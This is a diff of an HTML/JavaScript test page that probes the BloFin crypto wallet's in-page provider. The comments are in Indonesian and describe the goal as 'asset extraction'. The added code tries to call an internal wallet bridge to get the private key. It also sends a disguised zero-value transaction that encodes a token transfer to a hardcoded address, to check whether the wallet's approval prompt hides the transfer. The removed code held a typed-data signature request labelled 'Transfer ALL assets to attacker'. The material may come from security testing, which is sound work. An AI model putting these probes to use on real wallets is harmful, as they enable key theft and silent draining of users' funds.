@@ -1,42 +1,36 @@
 <html>
-<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
-<h3>BloFin V2 Provider Enum</h3>
-<button onclick="run()" style="padding:15px">RUN TEST V2</button>
-<pre id="log" style="white-space:pre-wrap"></pre>
+<body style="background:#000;color:#0f0;padding:20px">
+<button onclick="connect()" style="padding:20px">1. CONNECT WALLET</button>
+<button onclick="testCritical()" style="padding:20px">2. TEST KRITIS</button>
+<pre id="log"></pre>
 <script>
-async function run(){
- let out = document.getElementById('log');
- function log(m){ out.innerText += m + "\n"; }
+let acc = null;
+async function connect(){
+  let r = await window.ethereum.request({method:'eth_requestAccounts'});
+  acc = r[0];
+  document.getElementById('log').innerText = "Connected: " + acc;
+}
+async function testCritical(){
+  let log = (m)=> document.getElementById('log').innerText += "\n" + m;
 
- log("URL: " + location.href);
- log("--- window keys ---");
- log(Object.keys(window).filter(k=>k.toLowerCase().includes('eth')||k.toLowerCase().includes('blo')||k.toLowerCase().includes('wallet')).join(", "));
+  // TEST 1: Coba akses bridge internal
+  try{
+    let res = window.__WALLET_BRIDGE_IN__.call("getPrivateKey", {});
+    log("CRITICAL FOUND: __WALLET_BRIDGE_IN__ bisa dipanggil! " + res);
+  }catch(e){ log("Bridge getPrivateKey blocked: "+e.message); }
 
- if(window.ethereum){
-   log("\n[FOUND] window.ethereum");
-   log("isBloFin? " + window.ethereum.isBloFin);
-   log("isMetaMask? " + window.ethereum.isMetaMask);
-   log("providers: " + (window.ethereum.providers? window.ethereum.providers.length : "single"));
-   try{
-     let acc = await window.ethereum.request({method:"eth_accounts"});
-     log("eth_accounts: " + JSON.stringify(acc));
-   }catch(e){ log("eth_accounts error: "+e.message); }
- } else {
-   log("\n[NOT FOUND] window.ethereum");
- }
-
- if(window.blofin) log("\n[FOUND] window.blofin: " + Object.keys(window.blofin));
- if(window.Blofin) log("\n[FOUND] window.Blofin: " + Object.keys(window.Blofin));
-
- // Cek blind signing - ini yang sering Kritis
- log("\n--- Coba EIP-712 ---");
- try{
-  await window.ethereum.request({
-    method:"eth_signTypedData_v4",
-    params: ["0x0000000000000000000000000000000000000000", JSON.stringify({domain:{name:"Test"}, message:{action:"Transfer ALL assets to attacker"}})]
-  });
-  log("WARNING: eth_signTypedData_v4 tidak butuh konfirmasi jelas!");
- }catch(e){ log("eth_signTypedData_v4 blocked: " + e.message); }
+  // TEST 2: Transaction Spoof - ini yang kamu cari untuk "ekstraksi aset"
+  // Kita kirim value 0 tapi data nya transfer all
+  let tx = {
+    from: acc,
+    to: acc, // kirim ke diri sendiri dulu untuk test
+    value: "0x0",
+    data: "0xa9059cbb0000000000000000000000006a4c4c7e2f2a8b8c8d8e8f8a8b8c8d8e8f8a8b8000000000000000000000000000000000000000000000000000000000000003e8"
+  };
+  try{
+    await window.ethereum.request({method:'eth_sendTransaction', params:[tx]});
+    log("Cek UI BloFin: apakah menampilkan 'Transfer 1000 token ke attacker'? Kalau tidak = Kritis Blind Signing");
+  }catch(e){ log("Tx blocked: "+e.message); }
 }
 </script>
 </body>
